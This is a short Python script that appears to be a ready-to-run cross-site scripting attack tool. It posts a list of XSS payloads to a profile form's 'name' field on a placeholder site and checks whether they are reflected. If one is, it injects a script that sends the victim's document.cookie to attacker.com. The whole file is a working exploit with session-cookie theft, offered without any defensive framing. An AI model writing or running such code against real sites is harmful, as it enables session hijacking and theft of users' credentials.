import requests
from bs4 import BeautifulSoup
import urllib.parse

# Target URL and payloads
TARGET_URL = 'http://vulnerable-website.com/profile'
PAYLOADS = [
    "<script>alert('XSS');</script>",
    "<img src=x onerror=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload=alert('XSS')>",
]

def submit_payload(url, payload):
    # Use requests to inject payload into the vulnerable input field
    response = requests.post(url, data={'name': payload})
    return response

def verify_xss(url):
    for payload in PAYLOADS:
        response = submit_payload(url, payload)
        # Check if payload is reflected back in the response
        if payload in response.text:
            print(f"Potential XSS vulnerability found with payload: {payload}")
            return True
    return False

def perform_xss_attack(url):
    # Verify if XSS vulnerability exists
    if verify_xss(url):
        print("XSS vulnerability confirmed. Exploiting...")
        # Payload to exploit XSS
        exploit_payload = "<script>fetch('http://attacker.com/log?cookie=' + document.cookie)</script>"
        response = submit_payload(url, exploit_payload)
        print("XSS exploit executed.")
    else:
        print("No XSS vulnerability found.")

perform_xss_attack(TARGET_URL)
